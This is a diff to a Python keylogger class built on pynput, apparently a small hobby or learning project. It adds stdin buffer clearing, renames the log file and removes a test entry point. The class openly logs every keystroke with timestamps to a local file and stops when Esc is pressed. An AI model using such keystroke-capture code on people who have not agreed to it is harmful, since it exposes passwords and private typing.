@@ -13,10 +13,11 @@
 from pynput.keyboard import Key, Listener
 import logging
 import datetime
+import sys
 
 class KeyLogger:    
 
-    def __init__(self, log_file='KeyloggerOutput.txt') -> None:
+    def __init__(self, log_file='KeyloggerOutput.log') -> None:
         self.log_file = log_file
         self.configure_logger()
 
@@ -63,7 +64,6 @@ class KeyLogger:
     
     # Method to log the pressed keystroke info
     def log_keystroke_pressed(self, key) -> None:
-
         # Check the key pressed to stop logging information
         if key == Key.esc:
             self.stop_log()
@@ -76,21 +76,21 @@ class KeyLogger:
         timestamp = self.get_timestamp()
         self.logger.info(f'Keystroke released ({self.get_keystroke_rep(key)}) event at {timestamp}')
     
+    # Method to clear the input buffer for termination
+    def clear_buffer(self) -> None:
+        try: 
+            while sys.stdin.readline():
+                pass
+        except KeyboardInterrupt:
+            pass
+
     # Method to start the logging
     def start_log(self) -> None:
         with Listener(on_press=self.log_keystroke_pressed, on_release=self.log_keystroke_released) as listener:
+            self.clear_buffer()
             listener.join()
 
     # Method to stop the keylogger program from running
     def stop_log(self) -> None:
         self.fileHandler.close()
-        exit()
-
-
-## ------------------------------------------------------------------------------------- ##
-
-if __name__ == '__main__':
-    test_keylogger_instance = KeyLogger('test_run.txt')
-    test_keylogger_instance.start_log()
-
-## ------------------------------------------------------------------------------------- ##
+        sys.exit()
